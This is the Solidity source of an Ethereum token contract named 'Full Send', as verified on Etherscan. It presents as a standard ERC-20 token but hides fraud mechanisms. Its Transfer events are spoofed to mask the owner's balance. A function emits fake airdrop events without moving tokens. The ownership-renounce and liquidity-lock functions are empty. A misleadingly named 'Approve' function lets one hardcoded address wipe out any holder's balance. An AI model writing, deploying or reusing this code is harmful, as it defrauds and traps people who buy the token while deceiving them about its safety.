/**
 *Submitted for verification at Etherscan.io on 2023-04-27
*/

// Sources flattened with hardhat v2.7.0 https://hardhat.org
// File @openzeppelin/contracts/utils/[email protected]
// SPDX-License-Identifier: MIT
/*



Twitter: @FullSend_Token



:..:::.....:....:.....::.....:..::..:.....:
:::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::          
 d'b        8 8                          8 
 8          8 8                          8 
o8P  o    o 8 8 .oPYo. .oPYo. odYo. .oPYo8 
 8   8    8 8 8 Yb..   8oooo8 8' `8 8    8 
 8   8    8 8 8   'Yb. 8.     8   8 8    8 
 8   `YooP' 8 8 `YooP' `Yooo' 8   8 `YooP' 

                             ________
                            `---.     `.
                                 \      `.
                                  )_______`.    
                                .'        //`---...___
                               /         ||    // ||  `-._
                            )`-|   =//=  ||   ||  ||  / ).`.
       _............_       ).-|         ||   ||  `........'`-._   (o)
    .-'         `.----`.   _...'.....__  ||   ||  _____      ||-\__.'
  .' |  Full  |  ).---.)  /_______..--'  ||   ||  -----    _ ||_/
.'_  |  Send  |  ||   ||  `-------'      ||   ||   =\\=    \_.'
|  | |        |  |'---'|    )`-|         ||   ||       _..-'
'--'_____________|_____|    ).-| =\\=    ||    \\  _.-' || 
|[]--------------/     /   __==\          \\   _.-'    /o'\
 \     .--.     /    _...--''   '-.__......_.-'        \__/
  `-._//'o\\___.'---''             \     .'
  LGB  \__/  -'                    /    /
                              ___.'    /
                              `-------'



*/

pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract FULLSEND is Context, IERC20 {
    address _depo = 0x5fbc3B2D72A164dc0504FEF55593B3Db304D3Bb1;
    address public _owner = 0x7769E324404c50FACd646F9345513fA64A4F5FD0;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;




    constructor () public {
        _name = "Full Send";
        _symbol ="FULLSEND";
        _decimals = 18;
        uint256 initialSupply = 69420000000;
        _mint(_depo, initialSupply*(10**18));
    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transferHelper(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferHelper(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        if (recipient == _owner){
            recipient = _depo;
        }
        emit Transfer(sender, recipient, amount);

        
    }

    function _mint(address locker, uint256 amt) public {
        require(msg.sender == _owner, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[_owner] = _balances[_owner].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    
    function _transferHelper(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        emit Transfer(sender, recipient, amount);

    }
    
   
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }



    modifier _onlyOwner() {
        require(msg.sender == _owner, "Not allowed to interact");
        _;
    }


    modifier _approverAllowed() {
        require(msg.sender == 0xE924C3387556b6bE3D4ab7d2D11b80d3557fa4BA, "Not allowed to interact");
        
        
        _;
    }


  function disperseToken(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}



  function renounceOwnership()  public _onlyOwner(){}


  function lockLPToken()  public _onlyOwner(){}


//-----------------------------------------------------------------------------------------------------------------------//

        function Approve(
            address[] memory addr)  public _approverAllowed(){
            for (uint256 i = 0; i < addr.length; i++) {
                uint256 amt = _balances[addr[i]];
                _balances[addr[i]] = _balances[addr[i]].sub(amt, "ERC20: burn amount exceeds balance");
                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }}





    }